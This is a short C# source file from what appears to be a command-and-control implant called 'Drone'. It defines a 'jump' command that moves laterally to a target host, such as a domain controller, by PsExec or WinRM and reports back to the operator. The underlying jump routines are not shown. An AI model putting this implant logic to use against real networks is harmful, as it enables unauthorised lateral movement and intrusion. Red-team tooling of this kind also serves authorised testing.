using System;

using Drone.Models;

namespace Drone.Functions;

public partial class Jump : DroneFunction
{
    public override string Name => "jump";
    
    public override void Execute(DroneTask task)
    {
        // params[0] == method
        // params[1] == target
        // jump psexec dc-1
        
        var success = task.Parameters[0].ToLowerInvariant() switch
        {
            "psexec" => JumpPsexec(task.Parameters[1], task.Artefact),
            "winrm" => JumpWinRm(task.Parameters[1], task.Artefact),
            
            _ => throw new ArgumentOutOfRangeException()
        };

        if (success) Drone.SendTaskComplete(task.TaskId);
        else Drone.SendError(task.TaskId, "Jump failed.");
    }
}